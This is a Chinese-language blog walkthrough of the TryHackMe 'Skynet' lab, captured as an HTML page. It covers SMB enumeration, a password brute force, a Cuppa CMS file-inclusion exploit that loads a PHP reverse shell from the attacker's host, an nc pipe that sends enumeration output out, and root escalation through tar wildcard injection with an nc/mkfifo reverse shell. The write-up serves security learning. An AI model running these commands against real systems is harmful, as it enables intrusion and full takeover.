@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文主要涉及:  smb信息枚举 tar通配符注入  靶机链接 靶机难度:简单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-Skynet">
+<meta property="og:url" content="http://atsud0.me/2020/04/19/TryHackMe-Skynet/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="本文主要涉及:  smb信息枚举 tar通配符注入  靶机链接 靶机难度:简单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_162808.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_163137.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_163500.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_163341.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_163601.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_163900.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_165527.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_164022.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_164235.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_175923.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_172404.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_173150.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_175246.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_181409.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_182231.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_182405.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_183158.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_183943.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_183740.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_183108.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_190408.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_190511.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_153639.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_132257.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_132608.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/photo_2020-04-18_21-06-39.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_143219.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_143342.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_144254.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_144447.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200419_145731.jpg">
+<meta property="article:published_time" content="2020-04-19T07:15:34.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.458Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="smb-enum">
+<meta property="article:tag" content="wildcard">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200418_162808.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/19/TryHackMe-Skynet/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TryHackMe-Skynet | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/19/TryHackMe-Skynet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TryHackMe-Skynet
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-19 15:15:34" itemprop="dateCreated datePublished" datetime="2020-04-19T15:15:34+08:00">2020-04-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要涉及:</p>
+<ul>
+<li>smb信息枚举</li>
+<li>tar通配符注入</li>
+</ul>
+<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener">靶机链接</a></p>
+<p>靶机难度:简单</p>
+<a id="more"></a>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规思路，上来先扫一下端口开放情况</p>
+<p><code>nmap -A -vvv -sT -T5 -p- 10.10.63.198</code></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_162808.jpg" alt="port-open"></p>
+<p>可以观察到目标开放了</p>
+<ul>
+<li>80 http</li>
+<li>22 ssh</li>
+<li>110 pop3</li>
+<li>139 smb</li>
+<li>143 imap</li>
+<li>445 smb</li>
+</ul>
+<p>其中110和143都是邮件服务器的端口。<br>先进去网站看看<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163137.jpg" alt="index.html"></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163500.jpg" alt="source-index"></p>
+<p>网站首页和网站源码都没什么发现，用<code>dirb</code>扫一下网站路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163341.jpg" alt="dirb-path"></p>
+<p>除了<code>squirrelmail</code>能访问外，其他都无法访问.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163601.jpg" alt="squirelmail"></p>
+<p>源码里也没发现什么东西。</p>
+<p>对之前探测到的smb端口进行用户枚举看看。<br><code>nmap -p445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.63.198</code></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163900.jpg" alt="smb-enum-shares"></p>
+<p>除了使用<code>nmap</code>的smb的信息枚举脚本外，我们还能使用<br><code>smbmap -H 10.10.63.198</code></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_165527.jpg" alt="smbmap"></p>
+<p>可以看到匿名目录允许我们可读的，并且还有一个<code>milesdyson</code>的目录，但是我们没有权限去访问它。</p>
+<p>但是我们可以先看看<code>anonymous</code>里面有什么东西</p>
+<p><code>smbclient //10.10.63.198/anonymous</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_164022.jpg" alt="smb-anonymous"></p>
+<p>把东西download下来再分析.</p>
+<p><code>smbget -R smb://10.10.63.198/anonymous/</code><br>下载一看，将近450M的文件，，大部分都是pdf.</p>
+<p>还有一个文件名为<code>attention.txt</code>这就是让我们去读他的意思。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_164235.jpg" alt="attention"></p>
+<p>文本内容为:</p>
+<blockquote>
+<p>A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br>-Miles Dyson</p>
+</blockquote>
+<p>大概意思就是提醒用户修改密码。</p>
+<p>再进入到下载回来的<code>log</code>目录，里面有3个文件。</p>
+<p>分别是<code>log1.txt,log2.txt,log3.txt</code></p>
+<p>log2和log3都是空文本，但是<code>log1.txt</code>的内容就很有趣了，他很有可能是记载了部分用户密码的文本文件。</p>
+<p>尝试用<code>milesdyson</code>作为用户名，<code>log1.txt</code>作为密码字典。使用<code>burpsplit</code>爆破密码，结果没一会就看到正确密码了。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_175923.jpg" alt="burp"></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_172404.jpg" alt="inbox"></p>
+<p>得到smb password。这时我们可以去尝试登录milesdyson目录了。<br><code>smbclient //10.10.63.198/milesdyson --user=milesdyson</code></p>
+<p>登录成功，看下有什么文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_173150.jpg" alt="smb-milesdyson"><br>进去notes目录看了之后，发现有许多markdown的文档,但是也有一个名为<code>important.txt</code>的文档<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_175246.jpg" alt="important"></p>
+<ol>
+<li>Add features to beta CMS /45kra24zxs28v3yd</li>
+<li>Work on T-800 Model 101 blueprints</li>
+<li>Spend more time with my wife</li>
+</ol>
+<p>这个<code>/45kra24zxs28v3yd</code>看上去像是个网站路径？</p>
+<p>尝试去访问一下看看。结果还真是一个隐藏路径</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_181409.jpg" alt="hide-path"></p>
+<blockquote>
+<p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br>a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
+</blockquote>
+<p>再一次对这个路径进行dirb扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_182231.jpg" alt="dirb-hide"><br>发现还有个<code>administrator</code>的管理后台</p>
+<p>进去登录后台，试试邮箱的密码结果不对。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_182405.jpg" alt="login-admin"></p>
+<p>查看源码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183158.jpg" alt="source-cuppa-cms"><br>发现标题是Cuppa CMS，什么内容管理系统的东东。去google搜索后，发现居然有<code>exploit</code>!!!</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183943.jpg" alt="haha"></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183740.jpg" alt="google-search"></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183108.jpg" alt="cuppa-cms-exp"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据exploit的提示来试试</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_190408.jpg" alt="tips-expoit"><br>执行第一条并没返回什么结果，执行第二条的时候成功查看到目标机器的<code>/etc/passwd</code>文件.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_190511.jpg" alt="etc/passwd"></p>
+<p>所以我们可以利用这个漏洞去反弹一个webshell<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">下载php-shell</a></p>
+<p>下载好payload之后，改个名字，修改端口和地址。然后用python -m SimpleHTTPServer打开我们的网页服务器，开启监听后执行以下命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;10.10.63.198&#x2F;45kra24zxs28v3yd&#x2F;administrator&#x2F;alerts&#x2F;alertConfigField.php\?urlConfig\&#x3D;http:&#x2F;&#x2F;10.10.245.230&#x2F;s.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_153639.jpg" alt="web-shell"></p>
+<p>此时应该能返回一个shell给我们了。</p>
+<p>这时可以进行机器的信息枚举了。会发现crontab有一个每分钟运行一次的脚本我们可以利用它。你可以使用信息枚举的脚本，也可以手动的去使用命令去查看。<br><code>python -m SimpleHTTPServer 80</code>将当前目录作为网站根目录，开启80端口。</p>
+<p>在目标机器上执行<br><code>wget http://10.10.245.230/LinEnum.sh</code>下载你的信息枚举脚本，同理，你也可以使用这种方式去下载你的其他恶意代码文件。</p>
+<p>使用nc将信息枚举后的内容下载到本地<br><code>nc -lp 1236 &gt; LinEnum-Skynet.txt</code><br><code>bash ./LinEnum.sh | nc -nv 10.10.245.230 1236 -q 1</code></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_132257.jpg" alt="LinEnum-crontab"></p>
+<p>可以看到有个每分钟以root用户执行一次的脚本，这个脚本位于milesdyson家目录下，所以我们可以去看看，脚本的权限和脚本内容</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_132608.jpg" alt="backup_sh"></p>
+<p>可以明显看到脚本内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">tar cf &#x2F;home&#x2F;milesydson&#x2F;backups&#x2F;backup.tgz *</span><br></pre></td></tr></table></figure>
+
+<p>每分钟将/var/www/html下所有的文件打包后以backup.tgz命名放到/home/milesydson/backups/下</p>
+<p>这里我很傻逼的以为可以通过修改环境变量的方式，伪造一个假的tar，可以反弹一个shell给我。但是实际上这个想法是错误的，<strong>因为crontab有它单独的默认环境变量，是不会被普通用户修改的临时变量所影响到的。</strong></p>
+<p><img src="https://images.atsud0.me/images/post/photo_2020-04-18_21-06-39.jpg" alt="crontab-path"></p>
+<p>之后没有思路了，只能去询问各位大佬。大佬们纷纷给我提示</p>
+<p><code>tar wildcard</code></p>
+<p>wildcard就是通配符的英文单词，所以使用要使用通配符注入。我在此之前甚至都不知道这个这都是一个注入点。</p>
+<p>结合<code>backup.sh</code>的脚本内容，所以我们可以知道<code>tar cf /home/milesdyson/backup/backup.tgz *</code>这条命令，就是我们的注入点。</p>
+<p>总的来说，这似乎是个从UNIX时代遗留下来的问题，假设我们创建了一个名为 “–help”的文件</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_143219.jpg" alt="--help"></p>
+<p>如果我们尝试去用通配符列出当前目录的所有文件的话。</p>
+<p>例如:</p>
+<p><code>ls *</code></p>
+<p>可以看到执行效果是变成了<code>ls \--help</code>,并不是如我们所想的，列出了当前目录的所有文件。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_143342.jpg" alt="--help2"></p>
+<p>所以我们可以利用这一漏洞去让tar执行我们的恶意代码。</p>
+<p>先在Kali上面用<code>msfvenom</code>生成我们的载荷,并开启监听.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat LHOST&#x3D;10.10.245.230 LPORT&#x3D;8888 R</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_144254.jpg" alt="msfve"></p>
+<p>然后在目标机器的/var/www/html/下创建以下文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot;&gt;&quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot;&gt;&quot;--checkpoint&#x3D;1&quot;</span><br><span class="line">echo &quot;mkfifo &#x2F;tmp&#x2F;cflw;nc 10.10.58.45 8888 0&lt;&#x2F;tmp&#x2F;clfw |&#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;cflw 2&gt;&amp;1&quot;&gt;shell.sh</span><br></pre></td></tr></table></figure>
+<p>将刚刚在kail上生成的恶意代码复制到目标机器上，生成一个shell.sh的文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_144447.jpg" alt="shell-sh"></p>
+<p>所以现在我们一共生成了三个文件分别是</p>
+<ul>
+<li>--checkpoint-action=exec=sh shell.sh</li>
+<li>--checkpoint=1</li>
+<li>shell.sh</li>
+</ul>
+<p>正常来说，创建好这三个文件后。一分钟后就能监听窗口拿到root权限shell的回调了。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_145731.jpg" alt="root"></p>
+<p>--checkpoint[=number] 每个处理指定数量的记录，就显示一次进度（这个文件可以不创建。所以实际上只需要两个文件。<br>--checkpoint-action=ACTION在每个检查点上执行ACTION，所以这个选项是用来规定达到检查点时执行程序。它允许我们执行任意的命令。</p>
+<p>关于通配符提权的更多文章:</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
+<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
+<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机，让我知道了smbmap这个工具，以及它的基本用法。但是对我收获更大的是Linux通配符注入这一知识点。在此之前，我也试过创建过以”-“开头的文件，也知道系统会把它认为是个命令，而不是文件，但是我脑子却没转过来，去利用这一特点去执行恶意代码。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/19/TryHackMe-Skynet/" title="TryHackMe-Skynet">http://atsud0.me/2020/04/19/TryHackMe-Skynet/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/smb-enum/" rel="tag"><i class="fa fa-tag"></i> smb-enum</a>
+              <a href="/tags/wildcard/" rel="tag"><i class="fa fa-tag"></i> wildcard</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/18/Covfefe/" rel="prev" title="Covfefe">
+      <i class="fa fa-chevron-left"></i> Covfefe
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/19/TryHackMe-ToysRus/" rel="next" title="TryHackMe-ToysRus">
+      TryHackMe-ToysRus <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
